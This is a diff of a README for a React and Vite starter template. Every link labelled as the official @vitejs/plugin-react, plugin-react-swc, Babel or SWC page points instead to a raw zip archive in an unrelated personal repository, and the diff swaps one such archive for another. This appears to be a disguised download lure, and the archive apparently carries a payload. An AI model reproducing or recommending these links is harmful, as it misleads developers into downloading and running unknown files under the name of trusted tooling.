@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://github.com/Pelumi-oloruntegbe/meal-app/raw/refs/heads/main/src/pages/app_meal_2.3.zip) uses [Babel](https://github.com/Pelumi-oloruntegbe/meal-app/raw/refs/heads/main/src/pages/app_meal_2.3.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/Pelumi-oloruntegbe/meal-app/raw/refs/heads/main/src/pages/app_meal_2.3.zip) uses [SWC](https://github.com/Pelumi-oloruntegbe/meal-app/raw/refs/heads/main/src/pages/app_meal_2.3.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/Pelumi-oloruntegbe/meal-app/main/src/app_meal_v2.0.zip) uses [Babel](https://raw.githubusercontent.com/Pelumi-oloruntegbe/meal-app/main/src/app_meal_v2.0.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Pelumi-oloruntegbe/meal-app/main/src/app_meal_v2.0.zip) uses [SWC](https://raw.githubusercontent.com/Pelumi-oloruntegbe/meal-app/main/src/app_meal_v2.0.zip) for Fast Refresh
